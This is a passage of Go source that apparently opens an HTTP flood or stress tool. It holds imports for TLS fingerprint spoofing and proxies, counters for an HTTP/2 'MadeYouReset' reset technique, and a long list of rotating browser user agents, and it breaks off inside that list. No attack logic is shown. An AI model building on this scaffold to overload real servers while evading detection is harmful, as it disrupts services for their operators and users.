package main

import (
	"bufio"
	"context"
	"crypto/rand"
	"crypto/tls"
	"errors"
	"flag"
	"fmt"
	"io"
	mathrand "math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/fatih/color"
	"github.com/quic-go/quic-go/http3"
	utls "github.com/refraction-networking/utls"
	"golang.org/x/net/http2"
	"golang.org/x/net/proxy"
)

const (
	maxAdaptiveDelay int64 = 8000
)

var (
	requestsSent         uint64
	responsesRec         uint64
	logMessages          []string
	logMessagesMux       sync.Mutex
	statusCounts         = make(map[string]map[int]uint64)
	statusCountsMux      sync.Mutex
	currentDelay         int64
	totalLatency         int64
	errorTypes           = make(map[string]uint64)
	errorMux             sync.Mutex
	madeYouResetAttempts uint64
	madeYouResetSuccess  uint64
	madeYouResetErrors   uint64
)

var (
	userAgents = []string{
		// ======================== CHROME 2025-2026 ========================
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
		// ======================== FIREFOX 2025-2026 ========================
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0",
		// ======================== EDGE 2025-2026 ========================
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
		// ======================== SAFARI 2025-2026 ========================
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
		// ======================== MOBILE - iOS 2025-2026 ========================
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
		// ======================== MOBILE - Android 2025-2026 ========================
		"Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; SM-S926B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
		// ======================== WINDOWS 11 SPECIFIC ========================
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/117.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Vivaldi/7.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Brave/131",
		// ======================== OLDER BUT COMMON (2024) ========================
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
		"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17",
		"Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
		"Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
		"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
		"Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16",
		"Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
		"Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4",
		"Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
		"Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
		"Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53",
		"Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2",
		"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H321 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4",
		"Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53",
		"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
		// ======================== CHROME 132-135 (2026) ========================
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
		// ======================== FIREFOX 135-138 (2026) ========================
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0",
		"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:138.0) Gecko/20100101 Firefox/138.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:137.0) Gecko/20100101 Firefox/137.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
		// ======================== EDGE 132-135 (2026) ========================
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
